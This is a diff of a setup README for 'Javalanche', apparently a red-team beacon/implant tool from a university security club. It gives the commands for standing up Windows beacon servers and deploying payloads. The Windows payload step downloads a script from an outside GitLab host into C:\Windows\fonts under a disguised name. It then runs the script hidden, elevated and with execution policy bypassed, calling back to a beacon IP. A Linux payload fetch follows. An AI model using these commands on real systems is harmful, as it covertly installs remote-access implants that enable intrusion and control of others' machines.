@@ -10,19 +10,22 @@ ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main
 
 ps> .\setup.ps1
 
+
 Windows Long Range Beacon Server
 
 ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
 
 ps> .\setup.ps1 -server Beacon
 
+
 Windows Payload
 
-ps> wget -o C:\Windows\fonts\windowsPayload.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
+ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
 
-ps> Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "C:\Windows\fonts\windowsPayload.ps1 -BeaconIPAddress {IP Address of Beacon}" -Verb RunAs
+ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
 
-Payload On Linux Client Side
+
+Linux Payload
 
 bash> git clone "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
 
